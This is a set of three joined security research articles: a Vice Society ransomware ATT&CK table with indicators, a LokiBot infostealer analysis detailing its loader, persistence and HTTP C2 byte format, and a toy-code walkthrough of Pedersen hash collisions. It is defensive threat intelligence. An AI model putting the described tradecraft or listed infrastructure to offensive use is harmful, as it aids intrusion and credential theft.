TA0001 Initial Access T1566 Phishing Vice Society is known to use phishing to gain initial access to victims’ systems. 
T1078 Valid Accounts Compromised valid credentials have been used by Vice Society to gain initial access. 
T1190 Exploit Public-Facing Applications Internet-facing applications and systems vulnerabilities can be exploited, such as PrintNightmare (CVE-2021-1675) and (CVE-2021-34527), to gain initial access. 
TA0002 Execution T1047 Windows Management Instrumentation (WMI) Malicious commands are executed via WMI as a means of “living off the land” and avoiding detection. 
T1053.005
Scheduled Task/Job Vice Society is known to execute commands via scheduled tasks/jobs. 
T1059.001 Command and Scripting Interpreter:
Powershell Vice Society utilizes PsExec for execution, persistence and defense evasion. 
T1059.003 Command and Scripting Interpreter:
Command Shell Batch files are used by Vice Society to deploy the ransomware via PsExec. 
TA0003 Persistence T1543.003 Modify System Process To maintain access to compromised systems, Vice Society leverages Windows operating functions to execute encrypted PowerShell. 
T1547.001 Registry Run Keys/Startup Folder Persistence is maintained after boot/reboot via malicious autostart registry keys. 
T1574.002 DLL Side-Loading Vice Society utilizes legitimate programs to side-load the group’s own DLL to execute their payload. 
TA0004 Privilege Escalation T1068 Exploitation for Privilege Escalation Software vulnerabilities, such as PrintNightmare (CVE-2021-1675) and (CVE-2021-34527), may be exploited in an attempt to elevate privileges. 
TA0005 Defense Evasion T1036
Masquerading Files dropped in the victim’s environment by Vice Society may have been altered to appear legitimate. 
T1055 Process Injection Legitimate processes have been corrupted by Vice Society via code injection, as a means to evade defenses. 
T1070 Indicator Removal on Host As with many other ransomware groups, Vice Society attempts to clear system, security and application logs on compromised machines. 
T1112 Modify Registry Vice Society attempts to disable Windows Defender by modifying the Registry. 
T1497 Sandbox Evasion Vice Society attempts to thwart reverse engineering and/or dynamic analysis via various sandbox evasion techniques. 
T1562.001
Impair Defenses: Disable or Modify Tools Attempts to disable or modify endpoint security, such as Microsoft Defender, on compromised devices. 
TA0006 Credential Access T1003 OS Credential Dumping Vice Society is known to utilize ntds.dit and comsvcs.dll to extract credentials. 
T1003.001 OS Credential Dumping: LSASS Memory Vice Society utilizes comsvcs.dll to dump credentials from Local Security Authority Subsystem Service. 
T1003.003 OS Credential Dumping: NTDS Vice Society attempts to “live off the land” by utilizing ntds.dit and ntdsutil.exe to dump Active Directory Database in an effort to obtain credentials. 
TA0007 Discovery T1046 Network Service Discovery Vice Society has been seen using the recon tool called Advanced Port Scanner to identify running services and local network infrastructure. 
T1482 Domain Trust Discovery Vice Society has been seen using the attack path reconnaissance tool Bloodhound during the initial stages of their attack before ransomware is deployed. 
TA00008 Lateral Movement T1021
Remote Services RDP is used by the group for lateral movement. 
T1021.002 Remote Services: SMB/Windows Admin Shares SMB shares have been used by Vice Society for lateral movement. 
T1080 Taint Shared Content Network drives and other shared storage locations are used by Vice Society to deliver payloads. 
T1570 Lateral Tool Transfer Lateral tool transfers have been used to move tools and files from one compromised system to another, including SMB and RDP. 
TA0010 Exfiltration T1020 Automated Exfiltration PowerShell scripts are used to exfiltrate data to external C2 servers. 
T1041 Exfiltration over C2 Channel Tools such as PowerShell and PsExec are used to exfiltrate data directly to C2 servers. 
T1048 Exfiltration Over Alternative Protocol Vice Society has used SMB in attempts to exfiltrate data. 
T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage Cloud storage and transfer services such as Mega.nz, Anonfiles.com, File.io, and Sendspace have been used by Vice Society to exfiltrate victim data. 
TA0011 Command and Control T1219
Remote Access Software Tools such as SystemBC and proprietary backdoors are known to be used by Vice Society. 
TA0040 Impact T1486 Data Encrypted for Impact Vice Society is known for its extortion tactics, encrypting devices and demanding a ransom. 
T1531 Account Access Removal Vice Society is known to change passwords of compromised victim accounts and privileged users, such as email and administrator accounts. 
Indicators of Compromise (IoCs) HelloKitty Elf samples featuring Vice Society ransom note header: 643a3121166cd1ee5fc6848f099be7c7c24d36f5922f58052802b91f032a5f0f 754f2022b72da704eb8636610c6d2ffcbdae9e8740555030a07c8c147387a537 78efe6f5a34ba7579cfd8fc551274029920a9086cb713e859f60f97f591a7b04 16a0054a277d8c26beb97850ac3e86dd0736ae6661db912b8782b4eb08cfd36e Zeppelin ransomware with the Vice Society ransom note header: 4a4be110d587421ad50d2b1a38b108fa05f314631066a2e96a1c85cc05814080 307877881957a297e41d75c84e9a965f1cd07ac9d026314dcaff55c4da23d03e faa79c796c27b11c4f007023e50509662eac4bca99a71b26a9122c260abfb3c6 dd89d939c941a53d6188232288a3bd73ba9baf0b4ca6bf6ccca697d9ee42533f 4440763b18d75a0f9de30b1c4c2aeb3f827bc4f5ea9dd1a2aebe7e5b23cfdf94 24efa10a2b51c5fd6e45da6babd4e797d9cae399be98941f950abf7b5e9a4cd7 bafd3434f3ba5bb9685e239762281d4c7504de7e0cfd9d6394e4a85b4882ff5d aa7e2d63fc991990958dfb795a0aed254149f185f403231eaebe35147f4b5ebe 001938ed01bfde6b100927ff8199c65d1bff30381b80b846f2e3fe5a0d2df21d Ab440c4391ea3a01bebbb651c80c27847b58ac928b32d73ed3b19a0b17dd7e75 Contact information: vicesociety@onionmail[.]org v-society.official@onionmail[.]org LarryGold@onionmail[.]org MollyThomson@onionmail[.]org BruceBoyle@onionmail[.]org SylvesterJones@onionmail[.]org brendaevans4454@onionmail[.]org warreinolds77@onionmail[.]org DaltonReed@onionmail[.]org FreddieFerrell@onionmail[.]org lewiselsberry@onionmail[.]org inezeng@onionmail[.]org lonnieguzman@onionmail[.]org thomasmoore@onionmail[.]org Domains: vsociethok6sbprvevl4dlwbqrzyhxcxaqpvcqt5belwvsuxaxsutyad[.]onion Qu5dci2k25x2imgki2dbhcwegqqsqsrjj5d3ugcc5kpsgbtj2psaedqd[.]onion Wavbeudogz6byhnardd2lkp2jafims3j7tj6k6qnywchn2csngvtffqd[.]onion gunyhng6pabzcurl7ipx2pbmjxpvqnu6mxf2h3vdeenam34inj4ndryd[.]onion Additional Resources Threat Brief:
Windows Print Spooler RCE Vulnerability (CVE-2021-34527 AKA PrintNightmare)Emerging Ransomware Groups: AvosLocker, Hive, HelloKitty, LockBit 2.0Threat
Assessment: Zeppelin Ransomware#StopRansomware: Vice Society | CISADark Web Profile: Vice Society - SOCRadar:registered: Cyber Intelligence Inc.
Michael Gillespie Twitter postUnit 42 ATOM: HelloKittyUNC2447 SOMBRAT and FIVEHANDS Ransomware:
A Sophisticated Financial Threat | Mandiant Get updates from Palo Alto Networks! Sign up to receive the latest news, cyber threat intelligence and research from us 
title: Spike in LokiBot Activity During Final Week of 2022 url: https://unit42.paloaltonetworks.com/lokibot-spike-analysis/ Executive Summary Unit 42 researchers have uncovered a malware distribution campaign that is delivering the LokiBot information stealer via business email compromise (BEC) phishing emails.
This malware is designed to steal sensitive information from victims' systems, such as passwords and banking information, as well as other sensitive data. 
In this blog, we will explain how attackers used an innocent-looking email to lure victims into opening an attachment.
The attachment contained a LokiBot information stealer. 
We will provide technical details on how the LokiBot sample uses obfuscation and a persistence mechanism to avoid detection.
We will also describe the command and control (C2) channel communication.
Finally, we will list the various applications from which the malware steals data. 
The Appendix of this blog will provide an in-depth description of each data byte in the HTTP based C2 communication, detailing the specific purpose of each byte.
It will also provide a breakdown of how the data byte is structured. 
Palo Alto Networks customers receive protections from and mitigations for LokiBot information stealer C2 communication in the following ways: Table of Contents IntroductionLokiBot Malware AnalysisFirst
StageLoaderFinal PayloadObfuscationMain
Stealing FeaturePersistenceHTTP C2 CommunicationConclusionIndicators of CompromiseSamplesInfrastructureAdditional ResourcesAppendix Introduction LokiBot (often referred to as Loki-bot or Loki PWS) is notorious information-stealing malware.
It collects sensitive data from web browsers, email clients, FTP servers and crypto wallets.
This threat then uploads this information to an attacker-controlled machine via HTTP POST. 
The malware can also create a backdoor on the infected machine, enabling an attacker to install further malicious software.
First identified in 2015, LokiBot has since been used in multiple security breaches.
Furthermore, the malware is constantly evolving, making it difficult to contain and protect against. 
During the winter holiday season of 2022, Unit 42 researchers noticed that our machine learning-based C2 detection solution identified a particular HTTP payload as malicious.
After analyzing its traffic patterns, we identified that it belonged to a LokiBot infection. 
After investigating the attack vector delivering this malware and further network traffic activity, we found the original email that included a ZIP file attached, which contained an ISO file.
The ISO file had the final payload. 
We have found that this attempt to deliver the LokiBot malware has strong ties to a BEC campaign.
BEC entails gaining unauthorized access to email leading to financial fraud, and it is one of the most prevalent and costly forms of cyberattacks today. 
Signs of BEC include fraudulent wire transfer requests, as well as spam or phishing emails sent from a customer’s corporate domain.
Victims might also notice missing or deleted emails due to unauthorized access to email systems. 
Figure 1.
Malspam delivers a LokiBot sample.
When collecting data, we also analyzed additional threat intel data sources such as ThreatFox.
We noticed that LokiBot activity had a relatively small amount of indicators of compromise (IoCs) when we first detected this sample.
However, during the end of 2022, the number of occurrences peaked in the last three days of December. 
Threat actors often increase their attack efforts during U.S. or other targeted nations' holidays.
During this time, cyberattacks are often more effective as security and other personnel take this time off. 
Figure 2 shows LokiBot activity from ThreatFox. Figure 2.
ThreatFox LokiBot monitoring.
Data source: ThreatFox.
LokiBot Malware Analysis First Stage 
The ISO file format is typically used to package the contents of an optical disc.
In this instance, it is used to deliver the LokiBot malware.
By using this file format, the attackers are trying to bypass malspam detection technologies that usually focus on detecting file types more commonly used in malware infection chains (e.g., EXE and DLL files, MS Office files). 
ISO files are also attractive to attackers because, while specific software was required to open them in the past, Windows includes an ISO file opener that mounts and opens the file with a simple double-click.
To the victim, the opening process simply looks like a regular directory. 
Loader Opening the ISO file gives us access to a PE EXE file that is actually a loader.
This file is an obfuscated .NET file using process hollowing, which is a code injection technique in which an attacker removes legitimate code from an executable and replaces it with malicious code. 
In this case, process hollowing was used to inject a malicious PE file into the legitimate process called aspnet_compiler.exe.
Figure 3 shows some IoCs in the memory of the infected process.
Dumping the PE from the process memory gives us access to the final LokiBot payload. 
Figure 3.
The infected process that contains IoCs.
Final Payload Obfuscation This LokiBot sample only uses one code obfuscation technique: API hashing.
Malware authors use this technique to retrieve export functions from loaded libraries using a computed hash. 
Replicating the hashing function implementation allows us to retrieve the corresponding APIs in the appropriate library.
Figure 4 shows a Python implementation of the API hashing algorithm used in the malware sample. 
Figure 4.
API hashing algorithm.
Main Stealing Feature The main function of the sample is building two arrays of 101 elements.
The first array is filled with indexes, and the second array is filled with pointers to functions.
The latter are the stealing functions. 
These functions are made to steal credentials from different types of applications and services on the Windows operating system: Browsers: Safari, Internet Explorer, Firefox and Chromium-based browsers FTP/SSH apps and clients Backup applications Email applications Notes applications Poker applications Password managers Windows credentials The main function of the malware is looping over these stealer functions to execute them, as shown in Figure 5. Figure 5.
Main stealer function loop.
All the credentials collected and extracted from the installed software will then be compressed by the aPLib algorithm and submitted to the C2 server through HTTP protocol using the POST method.
We’ll go into this in more detail in the HTTP C2 Communication section. 
Persistence In order to establish persistence on the targeted host, the malware starts by saving a copy of itself in a new folder in the %APPDATA% directory via the MoveFileExW or CopyFileW Windows API.
Then, it creates and sets a new value for the registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
This value, named as the created folder, is set to the path of the copied executable. 
HTTP C2 Communication LokiBot exfiltrates information to the C2 through the HTTP protocol.
This information includes the bot's version number (1.8) and can be found in the two bytes of the HTTP payload.
It also contains a User-Agent set as “Mozilla/4.08 (Charon; Inferno)”, and the Content-Key, which is a custom HTTP header whose value corresponds to a hash generated out of the HTTP header. 
Figure 6 shows a HTTP POST request and its corresponding message body.
This body contains the exfiltrated information, which is highlighted in different colors for each field.
We’ve also included the corresponding offset and size to provide a better visual reference of the data structure used by the malware, and to easily cross-reference each field of interest. 
Figure 6.
HTTP POST request (type 27 / data exfiltration).For a detailed list of each data field (offset and size) of the HTTP body (payload) please refer to the Appendix section. 
Similar to other information-stealing malware, this threat searches for and exfiltrates the following information: OS architecture Built-in admin Domain host name Hostname Local admin Operating system Screen resolution Username information The exfiltrated data that is unique to this information stealer malware includes the following: Unique key, which is an identifier that includes five randomly generated characters Binary ID, which indicates a domain that is commonly used in LokiBot infections (ckav[.]ru) Mutex value, which consists of a 24-character length string (taken from hashing the machine’s GUID using the MD5 algorithm) 
Potential hidden files (e.g., %APPDATA%\\079D53\\3AFB91.hdb), which are taken from the mutex value (for directory name with a character range from 8-13 bytes and a file name with a character range from 13-18 bytes) Hash database (.hdb) Keylogger database (.kdb) Lock file (.lck) Malware EXE (.exe) 
The bot also makes use of different payload types (located at the third and fourth byte of the HTTP body).
These types include the following: Stolen application/credential data (0x27) Get C2 commands from C2 Server (0x28) Exfiltrate keylogger data (0x2B) Other versions of this malware family can use additional payload types depending on the final action including the following: Exfiltrate cryptocurrency wallet (0x26) Exfiltrate files (0x29) 
Exfiltrate PoS data (0x2a) 
Exfiltrate screenshots (0x2c) Conclusion LokiBot malware has been used by attackers for many years.
There have been multiple versions of this threat.
It takes a lot of effort for any security team to constantly monitor the behavior changes in the malware and add the necessary protections. 
The Palo Alto Networks machine learning-based C2 detection solution, as part of Advanced Threat Prevention, detects and stops malicious C2 activity inline.
The model is regularly updated with the latest C2 communication from various types of malware.
This ensures that the detection capabilities are always up to date and capable of countering the ever-evolving threats posed by malicious actors. 
We would like to extend our gratitude to Doel Santos from Unit 42 and Nina Smith for helping on this investigation. 
Palo Alto Networks customers receive protections from and mitigations for LokiBot information stealer C2 communication in the following ways: We have distilled the knowledge we’ve gained from responding to hundreds of BEC incidents into our BEC Readiness Assessment offering, which is designed to help organizations strengthen their processes and technology to mitigate threats like the ones discussed in this blog. 
If you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: North America Toll-Free: 866.486.4842 (866.4.UNIT42) EMEA: +31.20.299.3130 APAC:
+65.6983.8730 Japan: +81.50.1790.0200 Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members.
CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.
Learn more about the Cyber Threat Alliance. Indicators of Compromise Samples ZIP file: 4edd01345f58b9cc04a88ca15d6b82895f44f5b9cb51ad63b809de09029670ac ISO: 8a5a024272361bb1ae12860c033bb52685d7b0ea3bce5fac46439f3f3ad36a84 Loader: 1b574a66c84924886daec4841e1b107258e019aaf6f336329ae8fae7cbd52a34 Infrastructure efvsx[.]gq 188.114.96[.]13 Additional Resources Appendix Field Description Offset Size LokiBot version 0x0 0x2 Payload type 0x2 0x2 BinaryID unicode 0x4 0x2 BinaryID length 0x6 0x4 
BinaryID string 0xa 0x7 Username unicode 0x11 0x2 Username length 0x13 0x4 Username string 0x17 0x12 Hostname unicode 0x29 0x2 Hostname length 0x2b 0x4 Hostname string 0x2f 0x16 Domain hostname unicode 0x45 0x2 Domain hostname length 0x47 0x4 Domain hostname string 0x4b 0x16 Screen width 0x61 0x4 
Screen height 0x65 0x4 Local admin 0x69 0x2 Built-In admin 0x6b 0x2 64-bit OS 0x6d 0x2 OS major 0x6f 0x2 OS minor 0x71 0x2 Get updates from Palo Alto Networks! Sign up to receive the latest news, cyber threat intelligence and research from us 
title: Breaking Pedersen Hashes in Practice\nurl: https://research.nccgroup.com/2023/03/22/breaking-pedersen-hashes-in-practice/\n\nThe Pedersen hash function has gained popularity due to its efficiency in the arithmetic circuits used in zero-knowledge proof systems.
Hash functions are a crucial primitive in cryptography, and zero-knowledge proof systems often make heavy use of them, for example when computing Merkle tree roots and paths.
Instead of being based on complex bit-fiddling operations like its standard counterparts (of the SHA or BLAKE families, for example), the Pedersen hash is an algebraic hash function that is simply computed as a linear combination of points on an elliptic curve.
They are therefore fairly efficient to compute in zero-knowledge circuits since their computations relies on field arithmetic, contrarily to the more traditional hash functions that have no convenient mathematical structure.\n\n
Based on foundational work from the early 1990s that also led to the formalization of commitment schemes (see for example [CHP91] and [Ped91]), the (originally-named) PedersenHash function was recently put in the spotlight when Zcash researchers Sean Bowe and Daira Hopwood developed specific optimizations for its efficient instantiation in zk-SNARK circuits
[Zcash].\n
However, even though the security of the Pedersen hash function is well-understood (since it relies on the assumed hardness of the discrete logarithm problem), a few easily-overlooked subtleties in its definition have the potential to invalidate its security guarantees and thus completely break the security of the systems based on it.\n
In this blog post, we start by describing the Pedersen hash function, the security guarantees it provides and some of the underlying assumptions it relies on.
We then show how some of the security properties can be broken when the requirements are not met.
The definition and the different attacks are accompanied by a toy example to illustrate the various concepts more concretely.\n
Table of Contents\nTable of ContentsDefinitionSecurity Properties and RequirementsOptimizationsVulnerability 1: Non-unique x-coordinateVulnerability 2: Related GeneratorsVulnerability 3: Variable-length InputConclusionAcknowledgementsReferences\nDefinition\nLet M be the message that we wish to hash (represented as a bit string of fixed length k ⋅ r), and let G1, G2, …, Gk be generators of the prime-order subgroup of our chosen elliptic curve group.
These generators must be sampled uniformly at random, such that no relationship between them is known.
Split the message M into k chunks of r bits each: M = M1M2 … Mk.
The Pedersen hash is defined as the linear combination of the points with the encoding of the message chunks:\nH(M) = H(M1M2 … Mk )
= ⟨M1⟩ ⋅
G1 + ⟨M2⟩ ⋅ G2 + … + ⟨Mk⟩
⋅
Gk\nWhere the function ⟨⋅⟩, commonly referred to as the encoding function, converts a bit string into a scalar element (for our purpose, scalar can be interpreted as an integer less than the subgroup order).\n
Note that the output of the hash function defined above is a point on the curve.
In practice, the desired output may be a field element, in which case a single coordinate of the resulting point is often used as the hash.\n
Toy Example:
Pedersen Hash DefinitionWe illustrate the Pedersen Hash function and its security properties and requirements using a toy example, with accompanying code in SageMath.
We use an elliptic curve with a prime group order, which is insecure by cryptographic standards due to the prime being small.
We select the elliptic curve defined by the curve equation y2 = x3 + x + 42, defined over the finite field of size 127.
The group of points on this curve has order 139, which is prime.
We pick two generators of this group, G1 = E(1, 60) and G2 = E(2, 59).
Our toy hash function computes the Pedersen hash as followsH(M) = H(M1 M2) = â¨M1â© â G1 +
â¨M2â© â G2Initially, we restrict our message length to be 12 bits, such that the individual message chunks M1 and M2 are 6 bits each.
Additionally, we need to select an encoding function, mapping 6-bit chunks into a scalar.
As a first attempt, let us simply interpret the 6-bit value as an integer encoded in little-endian bits, resulting in an integer in the range {0, 63}.
We refer to this encoding as the “identity” encoding (IdentityEncode() in the code below).The following code excerpt first specifies the chosen elliptic curve, picks two generators and defines a few helper functions before defining the GenericPedersenHash() function. \n
# First we pick an elliptic curve with prime order:\nF = GF(127)\nE = EllipticCurve(F, [F(1), F(42)])\nassert E.order().is_prime()\nprint(f"{E} with order {E.order()}")\n# Elliptic Curve defined by y^2 = x^3
+
x + 42 over Finite Field of size 127 with order
139\n\n# We pick two generators.
As the curve has prime order, all non-identity points\n# are generators\nG1 = E(1, 60)\nG2 = E(2, 59)\n
GENERATORS =
[G1, G2]\n\ndef IdentityEncode(lebs):\n    """\n    Encodes a binary string (assumed to be in little-endian bit order)\n    to an integer\n    """\n    return int(lebs[::-1], 2)\n\ndef EncodeMessage(msg, encode_function):\n    """\n    Helper function which encodes a message given a variable\n    encode function\n    """\n    return [encode_function(x) for x in msg]\n\ndef GenericPedersenHash(generators, encoded_chunks):\n    """\n    Helper function for computing the Pedersen hash of a message\n\n    The hash is computed as a linear combination of of the generators with\n    (already encoded) chunks used as scalar multiples\n    """\n    assert len(generators)
== len(encoded_chunks), "Incompatible lengths"\n\n    res = E(0)\n    for chunk, generator in zip(encoded_chunks, generators):\n        res += chunk * generator\n    return res\n\ndef PedersenHash(message, encode_function=IdentityEncode, generators=GENERATORS):\n    """\n    Computes the Pedersen hash of a message\n\n    Input: a message\n    Output: the Pedersen Hash of the message\n\n    Optional:\n        encode_function: the encoding function to break a message into integers\n        generators: elements G ∈ E which generate E\n    """\n    encoded_message = EncodeMessage(message, encode_function)\n    return GenericPedersenHash(generators, encoded_message)\nUsing the above, the code then showcases how the message ["010101", "000111"] is hashed, resulting in the point (3, 31).\n
# ============================ #\n#   Example of Pedersen Hash   #\n# ============================ #\n\nmessage =
["010101", "000111"]  
# M =
[42, 56]\nH = PedersenHash(message)\nprint(f"Hash of {message} = {H}")\n
# Hash of  ['010101', '000111']  =  (3 : 31 : 1)\n\n#
We check that the Pedersen hash of the message is equivalent to computing\n# the linear combination of the generator points and the integers representations\n# of the message chunks\nassert H == 42 * G1
+ 56 * G2\nSecurity Properties and Requirements\nThe Pedersen Hash function is collision-resistant for fixed-length input, provided the underlying encoding function is injective.
This security property and the definition of the hash function presented above have a few subtleties, which we now explore in more depth.\n
The first caveat is that the hash function is not collision-resistant for variable-length inputs.
It is also distinguishable from a random oracle and as such this function should not be used as a pseudorandom function (PRF).\n
A second important aspect is that in order for this hash function to provide the desired security properties (namely, collision-resistance), it is necessary for the underlying encoding function to be injective.
Recall that the property of an injective function is that it maps distinct elements of its domain to distinct elements of its codomain.
In the context of the encoding function ⟨⋅⟩, this means that there are no two different message chunks Mi and Mj that result in the same encoded output, see the illustration below.\n\n\n
The encoding function maps bit strings to scalars.
In the toy example above, we have seen an example of a simple encoding function where the bit strings were interpreted in little-endian as integers and therefore was clearly injective (within the parameters of our example).\n
But even with the simple encoding function used in the toy example, care should be taken to ensure that the allowed size of the message we hash is bounded.
Indeed, if we allowed larger bit strings to be hashed (such that their encoding is larger than the subgroup order), it would be easy for an attacker to compute collisions.
This is because for any point in the subgroup, multiplication by the subgroup order, call it r, yields the point-at-infinity; that is r ⋅ G = 0.
Thus, multiplying the point G by a scalar a produces the same result as multiplying G by a + k ⋅ r, for any value of k, since\n(a + k ⋅ r) ⋅ G = a ⋅ G + k ⋅ r ⋅ G = a ⋅ G + k ⋅ 0 = a ⋅ G\nThe example below illustrates how hashing messages larger than the expected size may lead to collisions.\n
Toy Example: Collisions Since the subgroup order is 139, adding this quantity (or multiples of it) to the scalar factors of the linear combination performed by the Pedersen hash function results in the same hash output.
Equivalently, computing the binary representation of these quantities and hashing them using our toy Pedersen hash function also results in a collision, as shown in the code snippet below.
Notice that the colliding message chunks are larger than 6 bits, further demonstrating that the function is not collision-resistant for variable-length inputs.\n
# Since the subgroup order is 139, adding this quantity (or multiples of it)\n# to the scalar factors of the linear combination computation performed by\n# the Pedersen hash function results in the same hash output, as can be seen below.\n\n
H2 = (42 + 139) *
G1 + (56 + 2 * 139)
* G2\nassert H == H2\n\ncolliding_message =
["10101101", "011100101"]\n\n# Ensures encoding colliding_message results in the integers\n# used explicitly above \nassert EncodeMessage(colliding_message, IdentityEncode)
==
[42 + 139, 56 + 2 * 139]\n\nH3 = PedersenHash(colliding_message)\nassert H == H3\nRecall that the output of the hash function is a point on the curve.
When implementations require this output to be a field element, they sometimes extract the first coordinate of the resulting curve point, which they use as the output of the hash function.
Crucially, this process can also lead to collisions.
Indeed, when using a Weierstrass curve with affine coordinates, the negation of a point P = (x, y) is -P = (x, -y).
Thus, when computing the Pedersen hash and taking only the first coordinate as a result, there is a natural collision, namely the negation of the point.
It is important to ensure that the encoding process followed by the scalar multiplication cannot produce two points that have the same coordinate extracted as output.
For example, if using affine coordinates and a curve equation in Weierstrass form, one must ensure that the function cannot produce both P and -P if only the x-coordinate is outputted.\n
Finally, another important requirement of the Pedersen hash function is that the various generators have to be sampled uniformly at random.
Specifically, the discrete logarithm of any generator with respect to another one should not be known, not even to the protocol designers.
Implementers traditionally use hash-to-curve algorithms (a process which does not reveal the discrete logarithm of the output point) and nothing-up-my-sleeve numbers, to prove that the inputs to the hash-to-curve process were selected honestly.
Odd-looking sets of generators or opaqueness in the generation process could be indicative of a backdoor.\n
Optimizations\nIn practice, implementations typically use slightly more complex procedures to encode bit strings to scalar.
In doing so, they are able to compute point multiplications in a more efficient way, though special care needs to be taken to ensure the resulting encoding function is injective, as discussed in the previous section.\n
The simple Pedersen Hash function presented so far can be significantly sped up in the specific contexts used by zero-knowledge proof systems.
Since the generators are fixed (and known ahead of time), a method called windowed scalar multiplication can be used to more efficiently perform the multiplication by pre-computing and storing successive powers of the generators.\n
Windowed scalar multiplication leverages the simple observation that the multiplication of a curve point by a large scalar can be decomposed.\n
For example, assume our scalar is a 6-bit value b = b0b1b2b3b4b5, and we wish to compute the scalar multiplication b ⋅
G. We have\n b ⋅ G = b0 ⋅ G + 2b1 ⋅ G + 22b2 ⋅ G + 23b3 ⋅ G + 24b4 ⋅ G + 25b5 ⋅ G= (b0 + 2b1 + 22b2) ⋅ G + 23 (b3 + 2b4 + 22b5)
⋅ G\nSince the quantities in the parentheses can take any value in the {0, 7} range, one can precompute the eight values in the set {0, G, 2 ⋅ G, 3 ⋅ G, …, 7 ⋅ G} and perform a variant of a double-and-add algorithm, where at each step the doubling operation is repeated 3 times, and the adding operation involves adding one element from the pre-computed set.\n
This variant uses the same amount of doubling operation as the standard binary double-and-add algorithm, but it uses fewer point additions (which are generally slower than doubling).\n
Pushing the optimizations even further, the Zcash team decided to use a signed version of the windowed-multiplication method.
Specifically, they use a windowed scalar multiplication with an encoding where 3-bit chunks are mapped to elements of the range {-4, …, 4} {0}, instead of the range {0, …, 7}.\n
Nothing forces alternative implementations of the Pedersen Hash to follow the exact same encoding rules, though in practice many do.
The encoding function ⟨⋅⟩ defined in the Zcash protocol maps element binary strings of fixed length 3 ⋅ c to a scalar as follows:\n\nwhere in turn, the enc() function maps 3-bit chunks m
= b0 b1 b2 into elements of the range {-4, …, 4} {0} as\n\nThis choice of using a signed-digit windowed-multiplication method reduces the number of constraints necessary in the arithmetic circuit (since the lookup of the negation of a point can be performed efficiently as negating a point only requires a single constraint).\n
As discussed above, the security of Pedersen hash is guaranteed provided the encoding scheme is injective.
Using such a signed representation introduces a few subtleties that should be kept in check in order to ensure the collision-resistance of the hash function.
The Zcash team proved (in Theorem 5.4.1.
on page 78 of the protocol specifications, see [Zcash]) that the encoding function is indeed injective and thus provides the desired collision-resistance.
They did so by showing that the range of the encoding function ⟨⋅⟩ was a subset of the range , with  the group order.
This ensures that there is no overflow of the scalar multiplier that would be “wrapped-around”, which would lead to multiple inputs mapping to the same output, a break of the injectivity requirement.\n
They also ensured that the coordinate extraction procedure couldn’t lead to the issue described above where both a point and its negation could be obtained as the output of the hash procedure, which could be problematic when using the first-coordinate as the hash output.
This is described in Section 5.4.9.4 of the Zcash protocol specification [Zcash], where Lemma 5.4.7 shows that if a given point P = (u, v) is on the curve, then (u, -v) is not on the curve, thereby preventing the potential issue outlined.\n
Note the importance of restricting 0 in the output range of the encoding function.
If the zero scalar could be obtained, the result of the scalar multiplication would be the point-at-infinity, which could lead to unexpected issues when trying to use that result.\n
Now that we have a better understanding of the Pedersen hash and its security, let’s look at some of the attacks that apply if one were to overlook some of the requirements described so far.\n
Vulnerability 1: Non-unique x-coordinate\nIn this first vulnerability example, we show how implementations blindly using the x-coordinate of the hash output could lead to collisions.\n
Instead of using our toy “identity” encoding, we employ Zcash’s signed-digit encoding, which maps bit strings to a range of positive and negative integers centred around 0.\n
Recall that on a curve in Weierstrass form, the negation of a point P = (x, y) is -P = (x, -y).
Considering only the x-coordinate, a collision in the hash function output occurs when two messages result in the pair of points only differing in sign.\n
By using our toy Pedersen hash example, given a message M whose hash is equal to H(M) = H(M1 M2) = ⟨M1⟩ ⋅ G1 + ⟨M2⟩ ⋅ G2, the colliding message M’ is computed such that\nH(M’)
= ⟨M1‘⟩ ⋅ G1 + ⟨M2‘⟩ ⋅ G2 \n= – H(M) = – (⟨M1⟩ ⋅ G1 + ⟨M2⟩ ⋅ G2)\n
= – ⟨M1⟩ ⋅
G1 – ⟨M2⟩ ⋅ G2\nHence, to compute a collision for a message M, we have to find the message M′ such that the encoding of the chunks of M′ correspond to the negation of the respective encoded chunks of M, namely ⟨M1′⟩ = −⟨M1⟩ and ⟨M2′⟩ = −⟨M2⟩.\nThis is straightforward to perform when using Zcash’s encoding scheme, since the third bit of every 3-bit window encoded by the enc() function determines the sign of the output.
Hence, given a message hash H(M), the message M’ crafted by flipping every third bit of M produces a hash output equal to the negation of H(M), which coincide in their x-coordinate.
The code snippet below illustrates this.\n
# ========================================== #\n# Vulnerability 1 - Non-unique x-coordinate  #\n# ========================================== #\n\nH = ZcashPedersenHash(message)\nprint(f"Zcash's Hash of {message} = {H}")\n# Zcash's Hash of  ['010101', '000111']  =  (83 : 83 : 1)\n\ncolliding_message = ["011100", "001110"]\nH2 = ZcashPedersenHash(colliding_message)\n\nassert H[0] == H2[0]\nassert message !
= colliding_message\nNote that this could also happen if using the “identity” encoding used initially in our toy example if we allowed the size of the message chunk range to exceed half the group order.\n
It is important to repeat that Zcash’s implementation is not susceptible to this issue due to their curve and coordinate choice.\n
Vulnerability 2: Related Generators\nRecall that the original definition requires the generators to be sampled randomly, such that their discrete logarithm with respect to a common generator (or to each other) shall not be known.
In practice, standards have been developed for that purpose, see hash-to-curve.
Using our toy example, let’s see how an adversary could break the collision-resistance of the hash function if they knew the discrete logarithm of one of the generators with respect to the other one.\n
Consider the continuation of our example with the two generators G1 = E(1, 60) and G2 = E(2, 59), but with the additional knowledge that G2 = 35 ⋅ G1.
Using Zcash’s encoding rules, hashing the message we’ve been using so far, and running our toy example implementation, we can proceed as follows:\n# ======================================= #\n#   Vulnerability 2 - Related Generators  #\n# ======================================= #\n\n#
We know the discrete logarithm of G2 with respect to G1\nassert 35 * G1 == G2\n\nmessage =
["010101", "000111"]  
# M =
[42, 56]\nencoded_message = EncodeMessage(message, ZcashEncode)\nprint(f"Encoded Message: {encoded_message}")\n# Encoded Message:  
[-29, -63]\n\nH = ZcashPedersenHash(message)\nassert 129 * G1 == H\nSince the encoding of our message using Zcash’s encoding function is [-29, -63], the hash of this message corresponds to the linear combination\nH(M) = −29 ⋅ G1 − 63 ⋅ G2\nHowever, since we know that G2 = 35 ⋅ G1, we can rewrite the previous equation as\nH(M) = −29 ⋅ G1 − 63 ⋅ 35 ⋅ G1 = −2234 ⋅ G1 = 129 ⋅ G1\nsince -2234 is equal to 129 modulo the group order, 139.\n
Thus, in order to find a collision, we can simply work in the scalar field and find a solution to the equation ⟨M1⟩
